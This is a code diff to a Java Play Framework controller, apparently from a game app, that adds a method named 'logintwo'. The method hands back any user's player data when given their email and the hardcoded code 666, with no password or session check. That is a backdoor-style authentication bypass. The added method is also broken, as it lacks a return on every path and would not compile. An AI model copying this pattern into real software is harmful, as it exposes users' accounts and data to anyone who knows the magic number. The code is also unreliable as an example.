@@ -38,6 +38,17 @@ public class Application extends Controller {
     }
 
     @Transactional
+    public static Result logintwo(Integer code, String email){
+        if(code == 666){
+            Usuario u = null;
+            u = Sistema.getUsuario(email);
+            if (u != null) {
+                return ok(Json.parse(Sistema.getPlayer(u)));
+            }
+        }
+    }
+
+    @Transactional
     public static Result registerNoGame() {
         DynamicForm r = Form.form().bindFromRequest();
         String email, senha, nome;
